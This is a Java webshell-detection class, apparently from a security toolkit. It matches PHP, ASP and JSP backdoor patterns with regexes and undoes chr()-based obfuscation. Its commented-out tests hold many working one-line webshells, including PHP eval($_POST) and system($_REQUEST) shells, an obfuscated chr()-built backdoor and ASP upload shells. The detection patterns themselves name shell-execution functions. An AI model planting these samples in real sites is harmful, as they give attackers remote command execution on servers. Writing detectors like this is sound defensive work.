package alibaba.safe.webshell.find;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import alibaba.safe.utils.FileUtil;

public class WebShellFilter_0926 {

	
	// >>> all
	
	
	// >>> jsp
	
	
	// >>> php

//	// eval($_GET|POST|REQUEST|SESSION|SERVER
//	private static Pattern php_rule_0 = Pattern.compile("(eval|assert|array_map)[\\W]{0,20}\\([\\W]{0,20}\\$_(GET|POST|REQUEST|SESSION|SERVER)");
//	
//	// eval(gzuncompress|gzinflate|base64_decode|str_rot13
//	private static Pattern php_rule_1 = Pattern.compile("(eval|assert|array_map)[\\W]{0,20}\\([\\W]{0,20}(gzuncompress|gzinflate|base64_decode|str_rot13)");

	
	// eval ($_GET['1']);
	// eval (gzuncompress($_GET['1']));
	// eval ('')
	/** 正则表达式 */
	static List<String> regexs = Arrays
			.asList(
					
					"function_exists\\s*\\(\\s*[\'|\"](popen|exec|proc_open|system|passthru)+[\'|\"]\\s*\\)",
				    "(exec|shell_exec|system|passthru)+\\s*\\(\\s*\\$_(\\w+)\\[(.*)\\]\\s*\\)",
				    "((udp|tcp)://(.*);)+",
				    "preg_replace\\s*\\((.*)/e(.*),\\s*\\$_(.*),(.*)\\)",
				    "preg_replace\\s*\\((.*)\\(base64_decode\\(\\$",
				    "(eval|assert|include|require|include_once|require_once)+\\s*\\(\\s*(base64_decode|str_rot13|gz(\\w+)|file_(\\w+)_contents|(.*)php://input)+",
				    "(eval|assert|include|require|include_once|require_once|array_map|array_walk)+\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)",
				    "eval\\s*\\(\\s*\\(\\s*\\$\\$(\\w+)",
				    "(include|require|include_once|require_once)+\\s*\\(\\s*[\'|\"](\\w+)\\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\'|\"]\\s*\\)",
				    "\\$_(\\w+)(.*)(eval|assert|include|require|include_once|require_once)+\\s*\\(\\s*\\$(\\w+)\\s*\\)",
				    "\\(\\s*\\$_FILES\\[(.*)\\]\\[(.*)\\]\\s*,\\s*\\$_(GET|POST|REQUEST|FILES)+\\[(.*)\\]\\[(.*)\\]\\s*\\)",
				    "(fopen|fwrite|fputs|file_put_contents)+\\s*\\((.*)\\$_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\](.*)\\)",
				    "echo\\s*curl_exec\\s*\\(\\s*\\$(\\w+)\\s*\\)",
				    "new com\\s*\\(\\s*[\'|\"]shell(.*)[\'|\"]\\s*\\)",
				    "\\$(.*)\\s*\\((.*)/e(.*),\\s*\\$_(.*),(.*)\\)",
				    "\\$_=(.*)\\$_",
				    "\\$_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\]\\(\\s*\\$(.*)\\)",
				    "\\$(\\w+)\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\]\\s*\\)",
				    "\\$(\\w+)\\s*\\(\\s*\\$\\{(.*)\\}",
				    "\\$(\\w+)\\s*\\(\\s*chr\\(\\d+\\)",
				    
				    // --------------------
				    // eval request("sb")
				    "([\\W]|^)(execute|eval|ExecuteGlobal)\\s+request\\s*\\(\\s*\"(.)*\"\\)",
				    // execute(request("sb")
				    "([\\W]|^)(execute|eval|ExecuteGlobal)\\s*\\(\\s*request\\s*\\(\\s*\"(.)*\"\\)",
				    //eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("a"))
				    "([\\W]|^)eval\\s*\\(\\s*chr\\s*\\(\\s*\\d+\\s*\\)\\s*\\+\\s*chr\\s*\\(",
				    // eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")
				    "([\\W]|^)eval\\s*\\(\\s*[\"|\'](\\w)+[\"|\']\\s*&\\s*[\"|\'](\\w)+[\"|\']",
				    // eval(Request.Item["pass"],"unsafe");
				    "([\\W]|^)eval\\s*\\(\\s*Request\\.Item\\[\\s*\"(\\w+)\"\\s*\\]\\s*",
				    // new ReflectionFunction($_GET[m])
				    "([\\W]|^)new\\s+ReflectionFunction\\s*\\(\\s*\\$_",
				    // eval($fatezero);
				    "([\\W]|^)eval\\s*\\(\\$\\w+\\)",
				    // eval^($_POST[c]^);
				    "([\\W]|^)eval\\W*\\(\\W*\\$_POST\\[",
				    // shell.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test.php 
				    "([\\W]|^)wget\\s*http://",
				    // @eval(get_magic_quotes_gpc()
				    "@eval\\s*\\(\\s*get_magic_quotes_gpc"
				    
					
					

			);

	static List<Pattern> patterns = new LinkedList<>();

	static {
		for (String regex : regexs) {
			patterns.add(Pattern.compile(regex, Pattern.CASE_INSENSITIVE));
		}
	}		
	
	// >>> asp
	
	private static boolean _check(String input){
		
		for (Pattern pattern : patterns) {
			if (pattern.matcher(input).find()) {
				return true;
			}
		}
		
		return false;
	}
	

	static boolean check(String input){
		
		
		// base64_decode|str_rot13|urldecode|gzinflate|gzdecode
		if(input.contains("base64_decode")
				||input.contains("str_rot13")
				||input.contains("urldecode")
				||input.contains("gzinflate")
				||input.contains("gzdecode")			
				||input.contains("Request.Files.Count")
				||input.contains("Request.Files[")
				||input.contains("System.Convert.FromBase64String")
				||input.contains("request.getParameter")
				||input.contains("Runtime.getRuntime().exec(")
				||input.contains("Class.forName("))
			
			return true;
		
		
//		if (input.contains("(") && input.contains(")")) {

			if (_check(input)) {
				return true;
			}

			for (int i = 0; i < 2; ++i) {
				// chr(99).chr(104).chr(114) -> 'c'.'h'.'r' -> 'chr'
				input = charNumberToChar(input);
				input = input.replace("'.'", "");
				input = variableNameToVariable(input);
				if (_check(input)) {
					return true;
				}
			}

//		}

		return false;
	}
	

	
	
	// chr(数字)
	private static Pattern pat_fun_char = Pattern.compile("chr\\(([\\d]{1,3})\\)");
	// chr(99).chr(104).chr(114) -> 'c'.'h'.'r'
	private static String charNumberToChar(String input){
		Matcher matcher = pat_fun_char.matcher(input);
		while(matcher.find()){
			try{
				String charStr = matcher.group(0);
				String number = matcher.group(1);
				input = input.replace(charStr,"'"+(char)Integer.parseInt(number)+"'");
			}catch(Exception e){
				continue;
			}
		}
		return input;
	}
	
	// $_uU(118) -> char(118)  $_uU='chr' ${_uU}='chr'
	private static Pattern pat_var_name = Pattern.compile("(\\$[_a-zA-Z]+[0-9a-zA-Z]*)='((.)*)';");
	private static String variableNameToVariable(String input){
		
		Map<String,String> variableMap = new HashMap<>();
		Matcher matcher = pat_var_name.matcher(input);
		while(matcher.find()){	
			String key  = matcher.group(1);
			variableMap.put(key, matcher.group(2));	
			
			// $_uU ${_uU}
			StringBuilder builder = new StringBuilder();
			builder.append("${");
			builder.append(key.substring(1));			
			builder.append("}");
			key = builder.toString();
			
			variableMap.put(key, matcher.group(2));	
		}
		
		for(Map.Entry<String, String> entry : variableMap.entrySet()){
			input = input.replace(entry.getKey(), entry.getValue());
		}
		return input;
	}
	
//	public static void main(String[] args) throws IOException {
//
//		BufferedReader reader = new BufferedReader(new FileReader(new File(
//				FileUtil.getBaseFilePath() + "/in.txt")));
//		String line = null;
//		int num = 0;
//		while ((line = reader.readLine()) != null) {
//			if (!check(line)) {
//				System.out.println(line);
//				num++;
//			}
//		}
//		System.out.println(num);
//
//	}
	
//	public static void main(String[] args) {
//		
//		String str = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?>";
//		System.out.println(check(str));
//		
//		str = "eval(base64_decode('AZHJKZ'));";
//		System.out.println(check(str));
//		
//		str = "<?php $s=@$_GET[2];if(md5($s.$s)==\"e67c2597ecad64bb4cdad6633b04107f\")@eval($_REQUEST[$s]); ?>";
//		System.out.println(check(str));
//		
//		str = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>";
//		System.out.println(check(str));
//		
//		str = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>";
//		System.out.println(check(str));
//		
//		str = "eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));";
//		System.out.println(check(str));
//		
//		str = "<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>";
//		System.out.println(check(str));
//		
//		str = "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?>";
//		System.out.println(check(str));
//		
//		str ="<?php @eval($_POST[c])?>";
//		System.out.println(check(str));
//		
//		str ="<?php system($_REQUEST['cmd']);?> ";
//		System.out.println(check(str));
//		
//		str ="<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>";
//		System.out.println(check(str));
//
//		str ="<?$_POST['sa']($_POST['sb']);?>";
//		System.out.println(check(str));
//		
//		str ="<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>";
//		System.out.println(check(str));
//		
//		str ="<?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\"); ?>";
//		System.out.println(check(str));
//		
//		str ="$filename=$_GET['xbid']; include_once ($filename);";
//		System.out.println(check(str));
//		
//		str ="<?php $c='ass'.'ert';${c}($_POST[4]);?>";
//		System.out.println(check(str));
//		
//		str ="<?php $k = str_replace(\"8\",\"\",\"a8s88s8e8r88t\");$k($_POST[\"8\"]); ?>";
//		System.out.println(check(str));
//		 
//		str ="<%eval request(\"sb\")%>";
//		System.out.println(check(str));
//		
//		str ="<%eval request(\"sb\")%>";
//		System.out.println(check(str));
//		
//		str ="<%execute request(\"sb\")%>";
//		System.out.println(check(str));
//		
//		str ="<%execute(request(\"sb\"))%>";
//		System.out.println(check(str));
//		
//		str ="<%execute request(\"sb\")%><%'<% loop <%:%>";
//		System.out.println(check(str));
//		
//		str ="Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")";
//		System.out.println(check(str));
//		
//		str ="<%execute(strreverse(\")\"\"xx\"\"(tseuqer lave\"))%>";
//		System.out.println(check(str));
//		
//		
//		str ="<% xx=request(\"xx\")  eval xx %> ";
//		System.out.println(check(str));
//		
//		
//		str ="<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%> ";
//		System.out.println(check(str));
//		
//		str ="<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>";
//		System.out.println(check(str));
//		
//		str ="<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"])  ); }%>";
//		System.out.println(check(str));
//		
//		str ="<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(\"f\")) ) %>";
//		System.out.println(check(str));
//		
//		
//		
//		
//	}
	
}
